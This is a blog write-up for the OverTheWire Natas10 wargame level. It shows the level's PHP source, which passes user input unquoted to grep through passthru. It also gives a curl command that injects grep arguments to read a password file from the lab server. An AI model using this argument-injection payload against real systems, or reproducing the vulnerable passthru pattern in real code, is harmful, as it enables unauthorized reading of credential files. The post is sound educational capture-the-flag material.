---
title: "Over the wire - Natas10"
date: 2026-03-14T11:11:00+00:00
draft: false 
toc: false
images:
tags:
  - Over the wire
  - Natas
  - Curl
  - Linux
  - Web Security
---


This one is the same as Natas9, but with a small "roadblock".

Let's check what do we have:
```bash
URL=http://natas10.natas.labs.overthewire.org

curl --user  natas10:$(cat natas10 ) $URL

curl --user  natas10:$(cat natas10 ) $URL"/index-source.html"
```


Just gonna show you the important part:
```html
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

We're dealing with a **preg_match** function that is checking for certain characters.
Unfortunately, we no longer can use the **;** end command trick to inject some bash commands :c

But the output is still passed to the **grep** command, meaning we can still use that to our advantage.

**Note**: Check the man pages for **grep**. 
```bash
man grep


NAME
       grep, egrep, fgrep, rgrep - print lines that match patterns

SYNOPSIS
       grep [OPTION...] -e PATTERNS ... [FILE...]

Matching Control
   -e PATTERNS, --regexp=PATTERNS
          Use PATTERNS as the patterns.  If this option is used multiple times or is combined with the  -f  (--file)
          option, search for all patterns given.  This option can be used to protect a pattern beginning with “-”.
```

The answer is right above - in the **man** page.

We need to create this command:
```bash
grep -i -e "." /etc/natas_webpass/natas11 dictionary.txt
```

This way we don't use the **;** end command trick, just use the grep command to search for the key, so the final curl looks like this:
```bash
curl --user natas10:$(cat natas10 ) $URL -d 'needle=-e "." /etc/natas_webpass/natas11' -d "submit=Submit"  | grep -m 1 "webpass" | sed "s/.*://" > natas11
```

This time the parsing is a little bit different that usual, I advise you to check and learn why that is. (By reading the **man** page and executing the commands yourself)

On to the next one!
